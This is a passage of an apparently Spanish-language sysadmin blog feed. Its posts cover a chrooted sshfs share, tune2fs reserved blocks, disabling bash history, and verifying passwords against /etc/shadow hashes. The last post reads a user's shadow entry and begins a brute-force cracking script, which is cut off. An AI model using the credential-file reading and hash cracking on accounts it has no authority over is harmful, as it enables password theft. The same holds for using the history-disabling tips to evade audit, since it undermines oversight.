&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nas@server:~$ cat .ssh/authorized_keys
ssh-rsa ...
nas@server:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este punto, ya podríamos entrar, pero como hemos decidido enjaular, tenemos que ajustar algunos permisos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;La carpeta en donde lo enjaulemos (su &lt;em&gt;home&lt;/em&gt;) debe pertenecer a &lt;strong&gt;root&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Esto nos obliga a tener una carpeta de trabajo en donde nuestro usuario pueda escribir&lt;/li&gt;
&lt;li&gt;Vamos a cambiar el propietario de la carpeta &lt;code&gt;.ssh&lt;/code&gt; para evitar que este usuario &lt;a href="http://www.linuxsysadmin.ml/2018/08/cambiando-la-posicion-del-fichero-authorized-keys.html"&gt;la pueda eliminar&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Con todo esto, la carpeta nos va a quedar así:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nas@server:/home$ tree -I gerard -augp
.
└── &lt;span class="o"&gt;[&lt;/span&gt;drwxr-xr-x root     root    &lt;span class="o"&gt;]&lt;/span&gt;  nas
    ├── &lt;span class="o"&gt;[&lt;/span&gt;drwxr-xr-x nas      nas     &lt;span class="o"&gt;]&lt;/span&gt;  archives
    └── &lt;span class="o"&gt;[&lt;/span&gt;drwxr-xr-x root     root    &lt;span class="o"&gt;]&lt;/span&gt;  .ssh
        └── &lt;span class="o"&gt;[&lt;/span&gt;-rw-r--r-- root     root    &lt;span class="o"&gt;]&lt;/span&gt;  authorized_keys

&lt;span class="m"&gt;3&lt;/span&gt; directories, &lt;span class="m"&gt;1&lt;/span&gt; file
nas@server:/home$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Estamos listos para enjaular; modificamos el fichero &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt; para enjaular a este usuario:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@server:~$ cat /etc/ssh/sshd_config
...
Match User nas
        ChrootDirectory /home/%u
        ForceCommand internal-sftp
gerard@server:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo nos queda recargar el servicio &lt;strong&gt;SSH&lt;/strong&gt; para que lea la nueva configuración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@server:~$ sudo service ssh restart
gerard@server:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;El cliente&lt;/h2&gt;
&lt;p&gt;Para poder montar el sistema de ficheros remoto, se necesita el paquete &lt;strong&gt;sshfs&lt;/strong&gt;, así que lo instalamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@client:~$ sudo apt-get install sshfs
...
gerard@client:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Necesitamos una carpeta en donde montar el sistema de ficheros remoto, que llamaremos &lt;code&gt;NAS&lt;/code&gt;; como no la tengo, la creo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@client:~$ mkdir NAS
gerard@client:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para montar la carpeta remota solo necesitamos un comando; asumimos que la parte privada de la clave &lt;strong&gt;SSH&lt;/strong&gt; está en &lt;code&gt;.ssh/id_rsa&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@client:~$ sshfs nas@server:/archives NAS -o &lt;span class="nv"&gt;idmap&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;user
gerard@client:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A partir de ahora podemos trabajar en la carpeta como si de una carpeta local se tratara, por ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@client:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; NAS/
gerard@client:~/NAS$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;123&lt;/span&gt; &amp;gt; file
gerard@client:~/NAS$ touch emptyfile
gerard@client:~/NAS$ ls -lh
total &lt;span class="m"&gt;4&lt;/span&gt;,0K
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; nas nas &lt;span class="m"&gt;0&lt;/span&gt; ago  &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:25 emptyfile
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; nas nas &lt;span class="m"&gt;4&lt;/span&gt; ago  &lt;span class="m"&gt;8&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:25 file
gerard@client:~/NAS$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y como es de esperar, estos ficheros han acabado en el servidor:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@server:~$ tree -augp /home/nas/
/home/nas/
├── &lt;span class="o"&gt;[&lt;/span&gt;drwxr-xr-x nas      nas     &lt;span class="o"&gt;]&lt;/span&gt;  archives
│   ├── &lt;span class="o"&gt;[&lt;/span&gt;-rw-r--r-- nas      nas     &lt;span class="o"&gt;]&lt;/span&gt;  emptyfile
│   └── &lt;span class="o"&gt;[&lt;/span&gt;-rw-r--r-- nas      nas     &lt;span class="o"&gt;]&lt;/span&gt;  file
└── &lt;span class="o"&gt;[&lt;/span&gt;drwxr-xr-x root     root    &lt;span class="o"&gt;]&lt;/span&gt;  .ssh
    └── &lt;span class="o"&gt;[&lt;/span&gt;-rw-r--r-- root     root    &lt;span class="o"&gt;]&lt;/span&gt;  authorized_keys

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;3&lt;/span&gt; files
gerard@server:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En el momento que nos cansemos de utilizar la unidad de red, solo tenemos que desmontarla, y la seguiremos viendo con lo que tenía antes del montaje.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@client:~$ fusermount -u NAS
gerard@client:~$ ls -lh NAS/
total &lt;span class="m"&gt;0&lt;/span&gt;
gerard@client:~$
&lt;/pre&gt;&lt;/div&gt;</content><category term="unidad"></category><category term="remota"></category><category term="ssh"></category><category term="sshfs"></category></entry><entry><title>Ajustando bloques de disco reservado con tune2fs</title><link href="http://www.linuxsysadmin.ml/2018/09/ajustando-bloques-de-disco-reservado-con-tune2fs.html" rel="alternate"></link><published>2018-09-03T10:00:00+02:00</published><updated>2018-09-03T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-09-03:/2018/09/ajustando-bloques-de-disco-reservado-con-tune2fs.html</id><summary type="html">&lt;p&gt;Llega el momento que tantas veces hemos repetido: montamos un servidor para una función concreta, y le asignamos un disco o partición a la carpeta que va a alojar la cantidad creciente de datos necesarios. De repente nos fijamos en que la capacidad del disco se ha perdido tras formatear …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Llega el momento que tantas veces hemos repetido: montamos un servidor para una función concreta, y le asignamos un disco o partición a la carpeta que va a alojar la cantidad creciente de datos necesarios. De repente nos fijamos en que la capacidad del disco se ha perdido tras formatear.&lt;/p&gt;
&lt;p&gt;No, no es una broma; solo tenemos que ver un ejemplo. Supongamos que asignamos un disco de 1 terabyte (no son difíciles ni caros de comprar hoy en día) a una máquina que lo va a necesitar para alojar todo lo referente a un entorno con &lt;strong&gt;docker&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
...
/dev/sda1        &lt;span class="m"&gt;7&lt;/span&gt;,9G   &lt;span class="m"&gt;1&lt;/span&gt;,3G  &lt;span class="m"&gt;6&lt;/span&gt;,2G  &lt;span class="m"&gt;17&lt;/span&gt;% /
/dev/sdb1       1007G    77M  956G   &lt;span class="m"&gt;1&lt;/span&gt;% /var/lib/docker
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;¿Véis en &lt;code&gt;/dev/sdb1&lt;/code&gt; que el tamaño usado y el disponible no coinciden con el tamaño del disco? Hay 50 gigabytes desaparecidos!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Este es un fenómeno que se da al formatear un disco con formato ext2, ext3 o ext4. Esto es así porque, muchas veces, este tipo de particiones sirven para alojar ficheros de sistema. Cuando estas particiones se llenan, el sistema deja de funcionar como es debido.&lt;/p&gt;
&lt;p&gt;La solución que los desarrolladores de los sistemas de ficheros extX encontraron fue la de reservar un bloque del disco (un 5% por defecto) al que solo puede acceder &lt;strong&gt;root&lt;/strong&gt; o algún servicio que ejecute como &lt;strong&gt;root&lt;/strong&gt;. Esto es fácil de comprobar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ sudo tune2fs -l /dev/sdb1 &lt;span class="p"&gt;|&lt;/span&gt; egrep -i &lt;span class="s2"&gt;&amp;quot;block (count|size)&amp;quot;&lt;/span&gt;
Block count:              &lt;span class="m"&gt;268435200&lt;/span&gt;
Reserved block count:     &lt;span class="m"&gt;13421760&lt;/span&gt;
Block size:               &lt;span class="m"&gt;4096&lt;/span&gt;
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que se han reservado 13421760 bloques de 4096 bytes (un 5% de todos los bloques). Usando la calculadora, nos salen 51,2 gigabytes, que es la cantidad en la que difiere el comando &lt;code&gt;df&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Como esta partición no necesita un trato especial si se llena, podemos reducir el porcentaje de bloques reservados, exactamente a 0:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ sudo tune2fs -m &lt;span class="m"&gt;0&lt;/span&gt; /dev/sdb1
tune2fs &lt;span class="m"&gt;1&lt;/span&gt;.43.4 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;31&lt;/span&gt;-Jan-2017&lt;span class="o"&gt;)&lt;/span&gt;
Se pone el porcentaje de bloques reservados a &lt;span class="m"&gt;0&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt; bloques&lt;span class="o"&gt;)&lt;/span&gt;
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si volvemos a mirar con &lt;code&gt;tune2fs&lt;/code&gt; los bloques reservados, veremos que ya no se reserva ninguno, que es el 0% solicitado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ sudo tune2fs -l /dev/sdb1 &lt;span class="p"&gt;|&lt;/span&gt; egrep -i &lt;span class="s2"&gt;&amp;quot;block (count|size)&amp;quot;&lt;/span&gt;
Block count:              &lt;span class="m"&gt;268435200&lt;/span&gt;
Reserved block count:     &lt;span class="m"&gt;0&lt;/span&gt;
Block size:               &lt;span class="m"&gt;4096&lt;/span&gt;
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Un nuevo vistazo con el comando &lt;code&gt;df&lt;/code&gt; nos mostrará que ya no hay 50gb desaparecidos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
...
/dev/sda1        &lt;span class="m"&gt;7&lt;/span&gt;,9G   &lt;span class="m"&gt;1&lt;/span&gt;,3G  &lt;span class="m"&gt;6&lt;/span&gt;,2G  &lt;span class="m"&gt;17&lt;/span&gt;% /
/dev/sdb1       1007G    77M 1007G   &lt;span class="m"&gt;1&lt;/span&gt;% /var/lib/docker
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Puestos a revisar el tamaño de la reserva, podemos mirar la partición &lt;code&gt;/dev/sda1&lt;/code&gt;. En esta partición reside el sistema operativo, y necesita algunos bloques reservados, por si acaso. Sin embargo, el tamaño de los discos crece y el tamaño reservado de forma porcentual, también; no es lo mismo reservar el 5% de 4gb que de 400gb...&lt;/p&gt;
&lt;p&gt;Personalmente creo que hay que dejar algún bloque reservado, pero con una partición de 8gb, el 5% son 400mb. Esto me parece una barbaridad, y creo que sobra espacio de emergencia. Si bajamos ese porcentaje al 1%, estaríamos hablando de 80mb de reserva, que son más que suficientes para acceder a liberar espacio si se llenara.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ sudo tune2fs -m &lt;span class="m"&gt;1&lt;/span&gt; /dev/sda1
tune2fs &lt;span class="m"&gt;1&lt;/span&gt;.43.4 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;31&lt;/span&gt;-Jan-2017&lt;span class="o"&gt;)&lt;/span&gt;
Se pone el porcentaje de bloques reservados a &lt;span class="m"&gt;1&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;20966&lt;/span&gt; bloques&lt;span class="o"&gt;)&lt;/span&gt;
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora podemos verificar que los bloques reservados bajan al 1%, lo que nos deja con 20966 bloques de 4096 bytes (unos 82mb).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ sudo tune2fs -l /dev/sda1 &lt;span class="p"&gt;|&lt;/span&gt; egrep -i &lt;span class="s2"&gt;&amp;quot;block (count|size)&amp;quot;&lt;/span&gt;
Block count:              &lt;span class="m"&gt;2096640&lt;/span&gt;
Reserved block count:     &lt;span class="m"&gt;20966&lt;/span&gt;
Block size:               &lt;span class="m"&gt;4096&lt;/span&gt;
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así pues, liberamos unos 320mb, lo que nos deja algo más de espacio para lo que podamos necesitar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@docker:~$ df -h
S.ficheros     Tamaño Usados  Disp Uso% Montado en
...
/dev/sda1        &lt;span class="m"&gt;7&lt;/span&gt;,9G   &lt;span class="m"&gt;1&lt;/span&gt;,3G  &lt;span class="m"&gt;6&lt;/span&gt;,5G  &lt;span class="m"&gt;17&lt;/span&gt;% /
/dev/sdb1       1007G    77M 1007G   &lt;span class="m"&gt;1&lt;/span&gt;% /var/lib/docker
gerard@docker:~$
&lt;/pre&gt;&lt;/div&gt;</content><category term="bloques reservados"></category><category term="tune2fs"></category></entry><entry><title>Deshaciéndome del historial de comandos en Bash</title><link href="http://www.linuxsysadmin.ml/2018/08/deshaciendome-del-historial-de-comandos-en-bash.html" rel="alternate"></link><published>2018-08-27T10:00:00+02:00</published><updated>2018-08-27T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-08-27:/2018/08/deshaciendome-del-historial-de-comandos-en-bash.html</id><summary type="html">&lt;p&gt;Muchas veces me pregunto para qué necesito guardar un histórico de comandos en mis sesiones de &lt;strong&gt;bash&lt;/strong&gt;. Como no soy nada repetitivo con los comandos que uso, solo se trata de basura acumulándose en &lt;code&gt;~/.bash_history&lt;/code&gt;, y un riesgo innecesario de que otros usuarios puedan chafardear los comandos que voy utilizando …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchas veces me pregunto para qué necesito guardar un histórico de comandos en mis sesiones de &lt;strong&gt;bash&lt;/strong&gt;. Como no soy nada repetitivo con los comandos que uso, solo se trata de basura acumulándose en &lt;code&gt;~/.bash_history&lt;/code&gt;, y un riesgo innecesario de que otros usuarios puedan chafardear los comandos que voy utilizando.&lt;/p&gt;
&lt;p&gt;¿Pero como funciona el mecanismo de &lt;em&gt;history&lt;/em&gt; en &lt;strong&gt;bash&lt;/strong&gt;?&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Cuando inicias sesión en &lt;strong&gt;bash&lt;/strong&gt;, se lee la lista del historial de comandos desde el fichero &lt;code&gt;~/.bash_history&lt;/code&gt;. Concretamente el fichero es el que indica el parámetro del &lt;em&gt;shell&lt;/em&gt; &lt;code&gt;HISTFILE&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Cada vez que escribes un comando, la lista en memoria se actualiza con el nuevo comando, quedando limitado por el parámetro de &lt;em&gt;shell&lt;/em&gt; &lt;code&gt;HISTSIZE&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Al salir de la sesión, las últimas &lt;code&gt;HISTFILESIZE&lt;/code&gt; líneas de la historia se escriben en &lt;code&gt;HISTFILE&lt;/code&gt;, para su uso en sesiones posteriores.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Eliminar el historial de comandos&lt;/h2&gt;
&lt;p&gt;Con esto en mente podemos hacer algunas modificaciones en los parámetros del &lt;em&gt;shell&lt;/em&gt; mediante el comando &lt;code&gt;set&lt;/code&gt; que puede tener consecuencias en el comportamiento del historial de comandos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Hacer un &lt;code&gt;unset&lt;/code&gt; de &lt;code&gt;HISTFILE&lt;/code&gt; va a causar que el histórico no se guarde en ningún fichero.&lt;/li&gt;
&lt;li&gt;Hacer un &lt;code&gt;set&lt;/code&gt; de &lt;code&gt;HISTSIZE&lt;/code&gt; a un valor dado, nos va a limitar los comandos recordados en la sesión de &lt;strong&gt;bash&lt;/strong&gt; actual.&lt;/li&gt;
&lt;li&gt;Hacer un &lt;code&gt;set&lt;/code&gt; de &lt;code&gt;HISTFILESIZE&lt;/code&gt; a un valor dado, va a limitar el número de comandos que se recuerden entre sesiones.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Considero interesante que los comandos se recuerden en esta sesión, pero no quiero que se guarden entre sesiones. En estos casos podemos limitar a 0 el valor de &lt;code&gt;HISTFILESIZE&lt;/code&gt;, con lo que el fichero &lt;code&gt;.bash_history&lt;/code&gt; quedaría vacío; otra opción es hacer un &lt;code&gt;unset&lt;/code&gt; de &lt;code&gt;HISTFILE&lt;/code&gt; para que el fichero no se guarde, y por lo tanto lo podamos eliminar sin que se recree.&lt;/p&gt;
&lt;p&gt;Para hacer estos &lt;code&gt;set&lt;/code&gt; y &lt;code&gt;unset&lt;/code&gt; permanentes, voy a utilizar el fichero &lt;code&gt;.bashrc&lt;/code&gt;, que nos permite ejecutarlos automáticamente en cada incio de sesión de &lt;strong&gt;bash&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@server:~$ tail -1 .bashrc
&lt;span class="nb"&gt;unset&lt;/span&gt; HISTFILE
gerard@server:~$ . .bashrc
gerard@server:~$ rm .bash_history
gerard@server:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto no vamos a volver a ver el molesto fichero, aunque mantenemos el historial de la sesión actual, que por defecto en &lt;strong&gt;Debian&lt;/strong&gt; se indica en el mismo fichero:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@server:~$ cat .bashrc
...
&lt;span class="c1"&gt;# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)&lt;/span&gt;
&lt;span class="nv"&gt;HISTSIZE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1000&lt;/span&gt;
&lt;span class="nv"&gt;HISTFILESIZE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2000&lt;/span&gt;
...
&lt;span class="nb"&gt;unset&lt;/span&gt; HISTFILE
gerard@server:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso recordaríamos un máximo de 1000 comandos durante la sesión, pero no entre sesiones.&lt;/p&gt;
&lt;h2&gt;Otros shells&lt;/h2&gt;
&lt;p&gt;Ya hemos visto como se puede hacer con &lt;strong&gt;bash&lt;/strong&gt;, pero no siempre tenemos un &lt;em&gt;shell&lt;/em&gt; tan configurable; yo mismo utilizo mucho &lt;strong&gt;Alpine Linux&lt;/strong&gt; y su &lt;em&gt;shell&lt;/em&gt; no admite estas variables.&lt;/p&gt;
&lt;p&gt;Si os pasa esto, tenéis dos opciones:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Quitar todos los permisos de escritura en el fichero, para que la lista no se pueda escribir en el mismo (con lo que se perdería entre sesiones)&lt;/li&gt;
&lt;li&gt;Sustituir el fichero &lt;code&gt;.ash_history&lt;/code&gt; o similar por un &lt;em&gt;soft link&lt;/em&gt; a &lt;code&gt;/dev/null&lt;/code&gt;; esto hará que no se escriba nada y, si se lee, devolverá 0 bytes (interpretado como 0 comandos).&lt;/li&gt;
&lt;/ul&gt;</content><category term="bash"></category><category term="histfile"></category></entry><entry><title>Verificando contraseñas manualmente en Linux</title><link href="http://www.linuxsysadmin.ml/2018/08/verificando-contrasenas-manualmente-en-linux.html" rel="alternate"></link><published>2018-08-20T10:00:00+02:00</published><updated>2018-08-20T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-08-20:/2018/08/verificando-contrasenas-manualmente-en-linux.html</id><summary type="html">&lt;p&gt;El otro día recibí una petición inusual; un usuario no se acordaba de su contraseña y quería que se la descifrara de los ficheros de sistema. Como eso no es factible, y tras mi negativa, él me dijo que no sabía si era una de una lista, lo que comprobé …&lt;/p&gt;</summary><content type="html">&lt;p&gt;El otro día recibí una petición inusual; un usuario no se acordaba de su contraseña y quería que se la descifrara de los ficheros de sistema. Como eso no es factible, y tras mi negativa, él me dijo que no sabía si era una de una lista, lo que comprobé.&lt;/p&gt;
&lt;p&gt;Las contraseñas en &lt;strong&gt;Linux&lt;/strong&gt; no se guardan; lo que se guarda es un &lt;em&gt;hash&lt;/em&gt; de las mismas en el fichero &lt;code&gt;/etc/shadow&lt;/code&gt;, y para verificarlas solo hay que hacer el mismo procedimiento de &lt;em&gt;hash&lt;/em&gt;, para luego comparar los resultados.&lt;/p&gt;
&lt;h2&gt;Un ejemplo&lt;/h2&gt;
&lt;p&gt;El usuario &lt;strong&gt;zeus&lt;/strong&gt; ha perdido su contraseña y por lo tanto no puede acceder a &lt;strong&gt;olympus&lt;/strong&gt;. Como administrador, puedo ver lo que hay en &lt;code&gt;/etc/shadow&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@olympus:~# grep zeus /etc/shadow
zeus:&lt;span class="nv"&gt;$6$jq62gTbU$kYZgWuKLuNTX0Ur&lt;/span&gt;.UWiuBJuIYltW3hc7EdI2/4RpldwUoLlRl9IdXgJb6B3kxEoAxWolDwXDCqOnz8SN0CKkJ1:17739:0:99999:7:::
root@olympus:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Los campos se separan por &lt;code&gt;:&lt;/code&gt;; el primer campo es el usuario y el segundo, el &lt;em&gt;hash&lt;/em&gt; de su password. Este &lt;em&gt;hash&lt;/em&gt; tiene la forma &lt;code&gt;$id$salt$hashed&lt;/code&gt;, y cada parte significa algo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;6&lt;/code&gt; &amp;rarr; es algoritmo usado para el &lt;em&gt;hash&lt;/em&gt;, donde "6" significa &lt;strong&gt;SHA-512&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;jq62gTbU&lt;/code&gt; &amp;rarr; el algoritmo &lt;strong&gt;SHA-512&lt;/strong&gt; requiere de un &lt;em&gt;salt&lt;/em&gt; para combinar con la contraseña antes del &lt;em&gt;hash&lt;/em&gt;, por seguridad.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;kYZgWuKLuNTX0Ur.UWiuBJuIYltW3hc7EdI2/4RpldwUoLlRl9IdXgJb6B3kxEoAxWolDwXDCqOnz8SN0CKkJ1&lt;/code&gt; &amp;rarr; este es el &lt;em&gt;hash&lt;/em&gt; propiamente dicho.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Más información &lt;a href="https://www.cyberciti.biz/faq/understanding-etcshadow-file/"&gt;aquí&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Sabiendo el algoritmo y el &lt;em&gt;salt&lt;/em&gt;, podemos hacer el &lt;em&gt;hash&lt;/em&gt; de cualquier contraseña. En caso de que el &lt;em&gt;hash&lt;/em&gt; sea el mismo que tenemos guardado, &lt;strong&gt;Linux&lt;/strong&gt; asume la contraseña como válida. Es importante recalcar que dos &lt;em&gt;salt&lt;/em&gt; distintos darían dos &lt;em&gt;hash&lt;/em&gt; distintos.&lt;/p&gt;
&lt;p&gt;Podemos probar con la contraseña &lt;code&gt;temporal&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;crypt&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;crypt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;temporal&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;$6$jq62gTbU&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s1"&gt;&amp;#39;$6$jq62gTbU$Zr/CBQAIKhWu1wCIE/jP0okICiaCQrw.eUBl4f9fQjgyCcLzkGB0dqfE8sM4tB1YG/DtLtaompXqvIrpPlErn1&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No nos cuadra con el ejemplo, con lo que contraseña sería rechazada. Probemos ahora con &lt;code&gt;supersecret&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;crypt&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;crypt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;supersecret&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;$6$jq62gTbU&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s1"&gt;&amp;#39;$6$jq62gTbU$kYZgWuKLuNTX0Ur.UWiuBJuIYltW3hc7EdI2/4RpldwUoLlRl9IdXgJb6B3kxEoAxWolDwXDCqOnz8SN0CKkJ1&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto es exactamente lo mismo que sacamos del fichero &lt;code&gt;/etc/shadow&lt;/code&gt;, con lo que la contraseña sería aceptada. Ahora le podemos comunicar a &lt;strong&gt;zeus&lt;/strong&gt; que puede entrar a &lt;strong&gt;olympus&lt;/strong&gt; usando la contraseña &lt;code&gt;supersecret&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Probando contraseñas por fuerza bruta&lt;/h2&gt;
&lt;p&gt;Si podemos hacer una función que nos permita validar una contraseña dada, podemos enchufar un montón de entradas. Tirando de &lt;strong&gt;python&lt;/strong&gt;, esto no tiene mucha dificultad:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@olympus:~# cat test_passwords.py
&lt;span class="c1"&gt;#!/usr/bin/env python3&lt;/span&gt;

import crypt

class PasswordCracker:
    def __init__&lt;span class="o"&gt;(&lt;/span&gt;self, shadow&lt;span class="o"&gt;)&lt;/span&gt;:
        self.shadow &lt;span class="o"&gt;=&lt;/span&gt; shadow
        self.salt &lt;span class="o"&gt;=&lt;/span&gt; shadow&lt;span class="o"&gt;[&lt;/span&gt;:shadow.rfind&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)]&lt;/span&gt;
    def verify&lt;span class="o"&gt;(&lt;/span&gt;self, password&lt;span class="o"&gt;)&lt;/span&gt;:
